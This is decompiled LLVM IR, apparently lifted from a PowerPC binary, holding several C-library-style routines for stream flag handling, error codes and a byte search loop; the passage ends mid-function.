define i32 @function_1000bca4(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bca4:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000bcb0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000bcbc = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000bcc4 = and i16 %v3_1000bcbc, 4
  %v3_1000bcc4 = icmp eq i16 %v1_1000bcc4, 0
  br i1 %v3_1000bcc4, label %dec_label_pc_1000bccc, label %dec_label_pc_1000bd04

dec_label_pc_1000bccc:                            ; preds = %dec_label_pc_1000bca4
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000bcd8, label %dec_label_pc_1000bcd0

dec_label_pc_1000bcd0:                            ; preds = %dec_label_pc_1000bccc
  br label %dec_label_pc_1000bcd8

dec_label_pc_1000bcd8:                            ; preds = %dec_label_pc_1000bccc, %dec_label_pc_1000bcd0
  %v1_1000bcd8 = add i32 %tmp, 4
  %v2_1000bcd8 = inttoptr i32 %v1_1000bcd8 to i32*
  %v3_1000bcd8 = load i32, i32* %v2_1000bcd8, align 4
  store i32 %v3_1000bcd8, i32* %r3.global-to-local, align 4
  store i32 268483808, i32* @lr, align 4
  %v1_1000bcdc = call i32 @function_1000cfb4(i32 %v3_1000bcd8)
  store i32 %v1_1000bcdc, i32* %r3.global-to-local, align 4
  %v2_1000bce0 = icmp sgt i32 %v1_1000bcdc, 0
  br i1 %v2_1000bce0, label %dec_label_pc_1000bd04, label %dec_label_pc_1000bce8

dec_label_pc_1000bce8:                            ; preds = %dec_label_pc_1000bcd8
  %v3_1000bce0 = icmp eq i32 %v1_1000bcdc, 0
  %v0_1000bce8 = load i32, i32* @r31, align 4
  %v1_1000bce8 = inttoptr i32 %v0_1000bce8 to i16*
  %v2_1000bce8 = load i16, i16* %v1_1000bce8, align 2
  br i1 %v3_1000bce0, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000bcf8

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000bce8
  %v1_1000bcf0 = or i16 %v2_1000bce8, 4
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bcf8:                            ; preds = %dec_label_pc_1000bce8
  %v1_1000bcf8 = or i16 %v2_1000bce8, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bd00:                            ; preds = %dec_label_pc_1000bcf0, %dec_label_pc_1000bcf8
  %v1_1000bcf0.sink.off0 = phi i16 [ %v1_1000bcf0, %dec_label_pc_1000bcf0 ], [ %v1_1000bcf8, %dec_label_pc_1000bcf8 ]
  store i16 %v1_1000bcf0.sink.off0, i16* %v1_1000bce8, align 2
  %v0_1000bd14.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bd04

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bca4, %dec_label_pc_1000bcd8, %dec_label_pc_1000bd00
  %v0_1000bd14 = phi i32 [ 0, %dec_label_pc_1000bca4 ], [ %v1_1000bcdc, %dec_label_pc_1000bcd8 ], [ %v0_1000bd14.pre, %dec_label_pc_1000bd00 ]
  store i32 %v0_1000bcb0, i32* @r31, align 4
  ret i32 %v0_1000bd14

; uselistorder directives
  uselistorder i16 %v2_1000bce8, { 1, 0 }
  uselistorder i32 %v1_1000bcdc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000bd04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bd00, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcd8, { 1, 0 }
}

define i32 @function_1000bd18(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000bd18:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000bd30 = load i16, i16* %arg1, align 2
  %v4_1000bd30 = zext i16 %v3_1000bd30 to i32
  %tmp9 = urem i16 %v3_1000bd30, 4
  %v3_1000bd34 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000bd34, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd3c

dec_label_pc_1000bd3c:                            ; preds = %dec_label_pc_1000bd18
  %v1_1000bd34 = zext i16 %tmp9 to i32
  %v1_1000bd3c = add nsw i32 %v1_1000bd34, -1
  store i32 %v1_1000bd3c, i32* %r10.global-to-local, align 4
  %v4_1000bd3c = icmp eq i32 %v1_1000bd3c, 0
  br i1 %v4_1000bd3c, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd44

dec_label_pc_1000bd44:                            ; preds = %dec_label_pc_1000bd3c
  %v1_1000bd44 = and i32 %v4_1000bd30, 2048
  %v3_1000bd44 = icmp eq i32 %v1_1000bd44, 0
  br i1 %v3_1000bd44, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd4c

dec_label_pc_1000bd4c:                            ; preds = %dec_label_pc_1000bd44
  %v2_1000bd4c = icmp sgt i32 %v1_1000bd3c, 1
  br i1 %v2_1000bd4c, label %dec_label_pc_1000bdf8, label %dec_label_pc_1000bd54

dec_label_pc_1000bd54:                            ; preds = %dec_label_pc_1000bd4c
  %v2_1000bd54 = add i32 %tmp, 40
  %v3_1000bd54 = inttoptr i32 %v2_1000bd54 to i32*
  %v4_1000bd54 = load i32, i32* %v3_1000bd54, align 4
  %v3_1000bd58 = icmp eq i32 %v4_1000bd54, 0
  br i1 %v3_1000bd58, label %dec_label_pc_1000bd60, label %dec_label_pc_1000bdf8

dec_label_pc_1000bd60:                            ; preds = %dec_label_pc_1000bd54
  %v2_1000bd60 = add i32 %tmp, 44
  %v3_1000bd60 = inttoptr i32 %v2_1000bd60 to i32*
  %v4_1000bd60 = load i32, i32* %v3_1000bd60, align 4
  %v2_1000bd64 = add i32 %tmp, 3
  %v3_1000bd64 = inttoptr i32 %v2_1000bd64 to i8*
  %v4_1000bd64 = load i8, i8* %v3_1000bd64, align 1
  %v5_1000bd64 = zext i8 %v4_1000bd64 to i32
  %v2_1000bd6c = sub nsw i32 %v1_1000bd3c, %v5_1000bd64
  %v1_1000bd70 = add nsw i32 %v2_1000bd6c, -1
  store i32 %v1_1000bd70, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000bd60, 1
  br i1 %tmp7, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd78

dec_label_pc_1000bd78:                            ; preds = %dec_label_pc_1000bd60
  %v2_1000bd78 = add i32 %tmp, 2
  %v3_1000bd78 = inttoptr i32 %v2_1000bd78 to i8*
  %v4_1000bd78 = load i8, i8* %v3_1000bd78, align 1
  %v5_1000bd78 = zext i8 %v4_1000bd78 to i32
  %v2_1000bd7c = sub nsw i32 %v1_1000bd70, %v5_1000bd78
  store i32 %v2_1000bd7c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000bd80

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd60, %dec_label_pc_1000bd44, %dec_label_pc_1000bd3c, %dec_label_pc_1000bd18, %dec_label_pc_1000bd78
  %v0_1000bda4 = phi i32 [ %v1_1000bd70, %dec_label_pc_1000bd60 ], [ %v1_1000bd3c, %dec_label_pc_1000bd44 ], [ 0, %dec_label_pc_1000bd3c ], [ 0, %dec_label_pc_1000bd18 ], [ %v2_1000bd7c, %dec_label_pc_1000bd78 ]
  %v1_1000bd80 = and i32 %v4_1000bd30, 64
  %v3_1000bd80 = icmp eq i32 %v1_1000bd80, 0
  %storemerge.in.in.v = select i1 %v3_1000bd80, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000bd94 = add i32 %tmp, 16
  %v3_1000bd94 = inttoptr i32 %v2_1000bd94 to i32*
  %v4_1000bd94 = load i32, i32* %v3_1000bd94, align 4
  %v1_1000bd98 = inttoptr i32 %arg2 to i32*
  %v2_1000bd98 = load i32, i32* %v1_1000bd98, align 4
  store i32 %v2_1000bd98, i32* %r4.global-to-local, align 4
  %v1_1000bd9c = add i32 %arg2, 4
  %v2_1000bd9c = inttoptr i32 %v1_1000bd9c to i32*
  %v3_1000bd9c = load i32, i32* %v2_1000bd9c, align 4
  store i32 %v3_1000bd9c, i32* %r5.global-to-local, align 4
  %v2_1000bda0 = sub i32 %storemerge, %v4_1000bd94
  %v2_1000bda4 = add i32 %v2_1000bda0, %v0_1000bda4
  store i32 %v2_1000bda4, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000bda4, 0
  %v1_1000bdac = zext i1 %tmp10 to i32
  %v2_1000bdac = ashr i32 %v2_1000bda4, 31
  %v3_1000bdac = and i32 %v2_1000bdac, -2
  %v4_1000bdac = or i32 %v3_1000bdac, %v1_1000bdac
  %v2_1000bdb0 = sub i32 %v3_1000bd9c, %v2_1000bda4
  %v3_1000bdb0 = sub i32 -1, %v2_1000bda4
  store i32 %v2_1000bdb0, i32* %r10.global-to-local, align 4
  %v6_1000bdb0 = icmp ule i32 %v2_1000bdb0, %v3_1000bdb0
  %v2_1000bdb4 = sub nsw i32 -1, %v4_1000bdac
  %v3_1000bdb4 = add i32 %v2_1000bd98, %v2_1000bdb4
  %v5_1000bdb4 = zext i1 %v6_1000bdb0 to i32
  %v6_1000bdb4 = add i32 %v3_1000bdb4, %v5_1000bdb4
  store i32 %v6_1000bdb4, i32* %v1_1000bd98, align 4
  %v0_1000bdbc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bdbc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bdbc = add i32 %v1_1000bdbc, 4
  %v3_1000bdbc = inttoptr i32 %v2_1000bdbc to i32*
  store i32 %v0_1000bdbc, i32* %v3_1000bdbc, align 4
  %v0_1000bdc0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bdc0 = inttoptr i32 %v0_1000bdc0 to i32*
  %v2_1000bdc0 = load i32, i32* %v1_1000bdc0, align 4
  %v1_1000bdc4 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000bdc4 = icmp sgt i32 %v2_1000bdc0, %v1_1000bdc4
  br i1 %v3_1000bdc4, label %dec_label_pc_1000bddc, label %dec_label_pc_1000bdcc

dec_label_pc_1000bdcc:                            ; preds = %dec_label_pc_1000bd80
  %v4_1000bdc4 = icmp eq i32 %v2_1000bdc0, %v1_1000bdc4
  br i1 %v4_1000bdc4, label %dec_label_pc_1000bdd0, label %dec_label_pc_1000bde0thread-pre-split

dec_label_pc_1000bdd0:                            ; preds = %dec_label_pc_1000bdcc
  %v1_1000bdd0 = add i32 %v0_1000bdc0, 4
  %v2_1000bdd0 = inttoptr i32 %v1_1000bdd0 to i32*
  %v3_1000bdd0 = load i32, i32* %v2_1000bdd0, align 4
  %v1_1000bdd4 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000bdd4 = icmp ugt i32 %v3_1000bdd0, %v1_1000bdd4
  br i1 %v3_1000bdd4, label %dec_label_pc_1000bddc, label %dec_label_pc_1000bde0thread-pre-split

dec_label_pc_1000bddc:                            ; preds = %dec_label_pc_1000bdd0, %dec_label_pc_1000bd80
  %v0_1000bddc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000bddc = sub i32 0, %v0_1000bddc
  store i32 %v1_1000bddc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bde0

dec_label_pc_1000bde0thread-pre-split:            ; preds = %dec_label_pc_1000bdcc, %dec_label_pc_1000bdd0
  %v0_1000bde0.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bde0

dec_label_pc_1000bde0:                            ; preds = %dec_label_pc_1000bde0thread-pre-split, %dec_label_pc_1000bddc
  %v0_1000bde0 = phi i32 [ %v0_1000bde0.pr, %dec_label_pc_1000bde0thread-pre-split ], [ %v1_1000bddc, %dec_label_pc_1000bddc ]
  %tmp8 = icmp sgt i32 %v0_1000bde0, -1
  br i1 %tmp8, label %dec_label_pc_1000bdfc, label %dec_label_pc_1000bde8

dec_label_pc_1000bde8:                            ; preds = %dec_label_pc_1000bde0
  %v0_1000bde8 = call i32 @function_10004e38()
  %v2_1000bdf0 = inttoptr i32 %v0_1000bde8 to i32*
  store i32 75, i32* %v2_1000bdf0, align 4
  %v0_1000be00.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdfc

dec_label_pc_1000bdf8:                            ; preds = %dec_label_pc_1000bd54, %dec_label_pc_1000bd4c
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdfc

dec_label_pc_1000bdfc:                            ; preds = %dec_label_pc_1000bde0, %dec_label_pc_1000bde8, %dec_label_pc_1000bdf8
  %v0_1000be00 = phi i32 [ %v0_1000bde0, %dec_label_pc_1000bde0 ], [ %v0_1000be00.pre, %dec_label_pc_1000bde8 ], [ -1, %dec_label_pc_1000bdf8 ]
  ret i32 %v0_1000be00

; uselistorder directives
  uselistorder i32 %v2_1000bdc0, { 1, 0 }
  uselistorder i32 %v2_1000bda4, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000bdfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bde0thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd80, { 4, 0, 1, 2, 3 }
}

define i32 @function_1000be14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000be14:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000be18 = load i32, i32* @lr, align 4
  store i32 %v0_1000be18, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000be28 = add i32 %arg1, 8
  %v2_1000be28 = inttoptr i32 %v1_1000be28 to i32*
  %v3_1000be28 = load i32, i32* %v2_1000be28, align 4
  %v1_1000be2c = add i32 %arg1, 12
  %v2_1000be2c = inttoptr i32 %v1_1000be2c to i32*
  %v3_1000be2c = load i32, i32* %v2_1000be2c, align 4
  %v2_1000be30 = sub i32 %v3_1000be2c, %v3_1000be28
  store i32 268484152, i32* @lr, align 4
  %v3_1000be34 = inttoptr i32 %v3_1000be28 to i16*
  %v4_1000be34 = call i32 @function_1000bca4(i16* %v3_1000be34, i32 %v2_1000be30, i32 %v2_1000be30)
  %v0_1000be38 = load i32, i32* @r29, align 4
  %v1_1000be38 = add i32 %v0_1000be38, 8
  %v2_1000be38 = inttoptr i32 %v1_1000be38 to i32*
  %v3_1000be38 = load i32, i32* %v2_1000be38, align 4
  %v2_1000be3c = add i32 %v3_1000be38, %v4_1000be34
  store i32 %v2_1000be3c, i32* %r0.global-to-local, align 4
  %v2_1000be40 = add i32 %v0_1000be38, 16
  %v3_1000be40 = inttoptr i32 %v2_1000be40 to i32*
  store i32 %v3_1000be38, i32* %v3_1000be40, align 4
  %v0_1000be44 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000be44 = load i32, i32* @r29, align 4
  %v2_1000be44 = add i32 %v1_1000be44, 20
  %v3_1000be44 = inttoptr i32 %v2_1000be44 to i32*
  store i32 %v0_1000be44, i32* %v3_1000be44, align 4
  store i32 %v0_1000be18, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000be34

; uselistorder directives
  uselistorder i32 %v3_1000be38, { 1, 0 }
  uselistorder i32 %v4_1000be34, { 1, 0 }
  uselistorder i32 %v3_1000be28, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1000be5c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000be5c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000be64 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000be70 = load i16, i16* %arg1, align 2
  %v4_1000be70 = zext i16 %v3_1000be70 to i32
  %v2_1000be74 = and i32 %v4_1000be70, %arg2
  %v5_1000be74 = icmp eq i32 %v2_1000be74, 0
  br i1 %v5_1000be74, label %dec_label_pc_1000be7c, label %dec_label_pc_1000be8c

dec_label_pc_1000be7c:                            ; preds = %dec_label_pc_1000be5c
  %v1_1000be7c = and i32 %v4_1000be70, 2176
  %v3_1000be7c = icmp eq i32 %v1_1000be7c, 0
  br i1 %v3_1000be7c, label %dec_label_pc_1000be84, label %dec_label_pc_1000be98

dec_label_pc_1000be84:                            ; preds = %dec_label_pc_1000be7c
  %v2_1000be84 = or i32 %v4_1000be70, %arg2
  %v1_1000be88 = trunc i32 %v2_1000be84 to i16
  store i16 %v1_1000be88, i16* %arg1, align 2
  %v0_1000be8c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000be8c

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000be5c, %dec_label_pc_1000be84
  %v0_1000be8c = phi i32 [ %tmp, %dec_label_pc_1000be5c ], [ %v0_1000be8c.pre, %dec_label_pc_1000be84 ]
  %v1_1000be8c = inttoptr i32 %v0_1000be8c to i16*
  %v2_1000be8c = load i16, i16* %v1_1000be8c, align 2
  %v3_1000be8c = zext i16 %v2_1000be8c to i32
  %v1_1000be90 = and i32 %v3_1000be8c, 16
  %v3_1000be90 = icmp eq i32 %v1_1000be90, 0
  br i1 %v3_1000be90, label %dec_label_pc_1000beb4, label %dec_label_pc_1000be98

dec_label_pc_1000be98:                            ; preds = %dec_label_pc_1000be7c, %dec_label_pc_1000be8c
  %v0_1000be98 = call i32 @function_10004e38()
  store i32 %v0_1000be98, i32* %r3.global-to-local, align 4
  %v2_1000bea0 = inttoptr i32 %v0_1000be98 to i32*
  store i32 9, i32* %v2_1000bea0, align 4
  br label %dec_label_pc_1000bea4

dec_label_pc_1000bea4:                            ; preds = %dec_label_pc_1000bebc, %dec_label_pc_1000be98
  %v0_1000bea4 = load i32, i32* @r31, align 4
  %v1_1000bea4 = inttoptr i32 %v0_1000bea4 to i16*
  %v2_1000bea4 = load i16, i16* %v1_1000bea4, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000beac = or i16 %v2_1000bea4, 8
  br label %dec_label_pc_1000bee8

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000be8c
  %v1_1000beb4 = and i32 %v3_1000be8c, 64
  %v3_1000beb4 = icmp eq i32 %v1_1000beb4, 0
  br i1 %v3_1000beb4, label %dec_label_pc_1000bedc, label %dec_label_pc_1000bebc

dec_label_pc_1000bebc:                            ; preds = %dec_label_pc_1000beb4
  store i32 268484288, i32* @lr, align 4
  %v0_1000bebc = call i32 @function_10005838()
  store i32 %v0_1000bebc, i32* %r3.global-to-local, align 4
  %v3_1000bec0 = icmp eq i32 %v0_1000bebc, 0
  br i1 %v3_1000bec0, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bea4

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000bebc
  %v0_1000bec8 = load i32, i32* @r31, align 4
  %v1_1000bec8 = inttoptr i32 %v0_1000bec8 to i16*
  %v2_1000bec8 = load i16, i16* %v1_1000bec8, align 2
  %v3_1000bec8 = zext i16 %v2_1000bec8 to i32
  %v1_1000becc = add i32 %v0_1000bec8, 8
  %v2_1000becc = inttoptr i32 %v1_1000becc to i32*
  %v3_1000becc = load i32, i32* %v2_1000becc, align 4
  %v1_1000bed0 = call i32 @__asm_rlwinm(i32 %v3_1000bec8, i32 0, i32 26, i32 24)
  %v2_1000bed0 = trunc i32 %v1_1000bed0 to i16
  %v1_1000bed4 = load i32, i32* @r31, align 4
  %v2_1000bed4 = add i32 %v1_1000bed4, 28
  %v3_1000bed4 = inttoptr i32 %v2_1000bed4 to i32*
  store i32 %v3_1000becc, i32* %v3_1000bed4, align 4
  %v3_1000bed8 = load i32, i32* @r31, align 4
  %v4_1000bed8 = inttoptr i32 %v3_1000bed8 to i16*
  store i16 %v2_1000bed0, i16* %v4_1000bed8, align 2
  %v0_1000bedc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bedc

dec_label_pc_1000bedc:                            ; preds = %dec_label_pc_1000beb4, %dec_label_pc_1000bec8
  %v0_1000bedc = phi i32 [ %v0_1000be8c, %dec_label_pc_1000beb4 ], [ %v0_1000bedc.pre, %dec_label_pc_1000bec8 ]
  %v1_1000bedc = inttoptr i32 %v0_1000bedc to i16*
  %v2_1000bedc = load i16, i16* %v1_1000bedc, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000bee4 = or i16 %v2_1000bedc, 1
  br label %dec_label_pc_1000bee8

dec_label_pc_1000bee8:                            ; preds = %dec_label_pc_1000bea4, %dec_label_pc_1000bedc
  %v2_1000bee8 = phi i32 [ %v0_1000bea4, %dec_label_pc_1000bea4 ], [ %v0_1000bedc, %dec_label_pc_1000bedc ]
  %storemerge.off0 = phi i16 [ %v1_1000beac, %dec_label_pc_1000bea4 ], [ %v1_1000bee4, %dec_label_pc_1000bedc ]
  %v3_1000bee8 = inttoptr i32 %v2_1000bee8 to i16*
  store i16 %storemerge.off0, i16* %v3_1000bee8, align 2
  store i32 %v0_1000be64, i32* @r31, align 4
  %v0_1000befc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000befc

; uselistorder directives
  uselistorder i32 %v4_1000be70, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 ()* @function_10005838, { 8, 5, 2, 1, 4, 3, 7, 6, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 8, 1, 2, 7, 9, 3 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bee8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bedc, { 1, 0 }
  uselistorder label %dec_label_pc_1000be98, { 1, 0 }
  uselistorder label %dec_label_pc_1000be8c, { 1, 0 }
}

define i32 @function_1000bf00(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf00:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000bf04 = load i32, i32* @lr, align 4
  store i32 %v0_1000bf04, i32* %r0.global-to-local, align 4
  %v0_1000bf0c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000bf18 = add i32 %arg1, 4
  %v2_1000bf18 = inttoptr i32 %v1_1000bf18 to i32*
  %v3_1000bf18 = load i32, i32* %v2_1000bf18, align 4
  %v2_1000bf1c = load i32, i32* %arg2, align 4
  %v1_1000bf20 = add i32 %tmp, 4
  %v2_1000bf20 = inttoptr i32 %v1_1000bf20 to i32*
  %v3_1000bf20 = load i32, i32* %v2_1000bf20, align 4
  store i32 268484392, i32* @lr, align 4
  %v4_1000bf24 = call i32 @function_1000cf34(i32 %v3_1000bf18, i32 %v2_1000bf1c, i32 %v3_1000bf20, i32 %arg3)
  %v1_1000bf28 = icmp slt i32 %v4_1000bf24, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000bf28, label %dec_label_pc_1000bf40, label %dec_label_pc_1000bf34

dec_label_pc_1000bf34:                            ; preds = %dec_label_pc_1000bf00
  %v1_1000bf34 = load i32, i32* @r31, align 4
  %v2_1000bf34 = inttoptr i32 %v1_1000bf34 to i32*
  store i32 %v4_1000bf24, i32* %v2_1000bf34, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000bf3c = load i32, i32* @r31, align 4
  %v2_1000bf3c = add i32 %v1_1000bf3c, 4
  %v3_1000bf3c = inttoptr i32 %v2_1000bf3c to i32*
  store i32 %tmp, i32* %v3_1000bf3c, align 4
  %v0_1000bf40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bf40

dec_label_pc_1000bf40:                            ; preds = %dec_label_pc_1000bf00, %dec_label_pc_1000bf34
  %v0_1000bf40 = phi i32 [ %tmp, %dec_label_pc_1000bf00 ], [ %v0_1000bf40.pre, %dec_label_pc_1000bf34 ]
  store i32 %v0_1000bf04, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bf0c, i32* @r31, align 4
  ret i32 %v0_1000bf40

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1000bf40, { 1, 0 }
}

define i32 @function_1000bf58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf58:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000bf58 = urem i32 %arg1, 256
  store i32 %v1_1000bf58, i32* %r4.global-to-local, align 4
  %v0_1000bf701 = load i32, i32* @r3, align 4
  %v1_1000bf702 = urem i32 %v0_1000bf701, 4
  %v3_1000bf704 = icmp eq i32 %v1_1000bf702, 0
  br i1 %v3_1000bf704, label %dec_label_pc_1000bf78, label %dec_label_pc_1000bf60

dec_label_pc_1000bf60:                            ; preds = %dec_label_pc_1000bf58, %dec_label_pc_1000bf60
  %v1_1000bf64 = phi i32 [ %v0_1000bf78.pre, %dec_label_pc_1000bf60 ], [ %v1_1000bf58, %dec_label_pc_1000bf58 ]
  %v0_1000bf60 = phi i32 [ %v1_1000bf6c, %dec_label_pc_1000bf60 ], [ %v0_1000bf701, %dec_label_pc_1000bf58 ]
  %v1_1000bf60 = inttoptr i32 %v0_1000bf60 to i8*
  %v2_1000bf60 = load i8, i8* %v1_1000bf60, align 1
  %v3_1000bf60 = zext i8 %v2_1000bf60 to i32
  %v4_1000bf64 = icmp eq i32 %v3_1000bf60, %v1_1000bf64
  %v0_1000bf68 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000bf64, i32 %v0_1000bf68)
  %v0_1000bf6c = load i32, i32* @r3, align 4
  %v1_1000bf6c = add i32 %v0_1000bf6c, 1
  store i32 %v1_1000bf6c, i32* @r3, align 4
  %v1_1000bf70 = urem i32 %v1_1000bf6c, 4
  %v3_1000bf70 = icmp eq i32 %v1_1000bf70, 0
  %v0_1000bf78.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000bf70, label %dec_label_pc_1000bf78, label %dec_label_pc_1000bf60

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf60, %dec_label_pc_1000bf58
  %v0_1000bf909 = phi i32 [ %v0_1000bf701, %dec_label_pc_1000bf58 ], [ %v1_1000bf6c, %dec_label_pc_1000bf60 ]
  %v0_1000bf78 = phi i32 [ %v1_1000bf58, %dec_label_pc_1000bf58 ], [ %v0_1000bf78.pre, %dec_label_pc_1000bf60 ]
  %v1_1000bf78 = mul i32 %v0_1000bf78, 256
  %v2_1000bf80 = or i32 %v1_1000bf78, %v0_1000bf78
  %v1_1000bf88 = mul i32 %v2_1000bf80, 65536
  %v2_1000bf8c = or i32 %v1_1000bf88, %v2_1000bf80
  br label %dec_label_pc_1000bf90

dec_label_pc_1000bf90:                            ; preds = %dec_label_pc_1000bffc, %dec_label_pc_1000bf90, %dec_label_pc_1000bf78
  %v0_1000bfcc = phi i32 [ %v0_1000bf909, %dec_label_pc_1000bf78 ], [ %v1_1000bf94, %dec_label_pc_1000bf90 ], [ %v1_1000bf94, %dec_label_pc_1000bffc ]
  %v1_1000bf90 = inttoptr i32 %v0_1000bfcc to i32*
  %v2_1000bf90 = load i32, i32* %v1_1000bf90, align 4
  %v1_1000bf94 = add i32 %v0_1000bfcc, 4
  %v2_1000bf9c = xor i32 %v2_1000bf90, %v2_1000bf8c
  %v1_1000bfa4 = add i32 %v2_1000bf9c, 2130640639
  %v2_1000bfa8 = xor i32 %v1_1000bfa4, %v2_1000bf9c
  %v1_1000bfac = add i32 %v0_1000bfcc, 1
  %v2_1000bfb0 = and i32 %v2_1000bfa8, -2130640640
  %v6_1000bfb0 = icmp eq i32 %v2_1000bfb0, -2130640640
  br i1 %v6_1000bfb0, label %dec_label_pc_1000bf90, label %dec_label_pc_1000bfb8

dec_label_pc_1000bfb8:                            ; preds = %dec_label_pc_1000bf90
  %v2_1000bfb8 = inttoptr i32 %v0_1000bfcc to i8*
  %v3_1000bfb8 = load i8, i8* %v2_1000bfb8, align 1
  %v4_1000bfb8 = zext i8 %v3_1000bfb8 to i32
  %v1_1000bfbc = add i32 %v0_1000bfcc, 3
  %v1_1000bfc0 = add i32 %v0_1000bfcc, 2
  %v4_1000bfc4 = icmp eq i32 %v4_1000bfb8, %v0_1000bf78
  br i1 %v4_1000bfc4, label %dec_label_pc_1000bfcc, label %dec_label_pc_1000bfd4

dec_label_pc_1000bfcc:                            ; preds = %dec_label_pc_1000bfb8
  ret i32 %v0_1000bfcc

dec_label_pc_1000bfd4:                            ; preds = %dec_label_pc_1000bfb8
  %v2_1000bfd4 = inttoptr i32 %v1_1000bfac to i8*
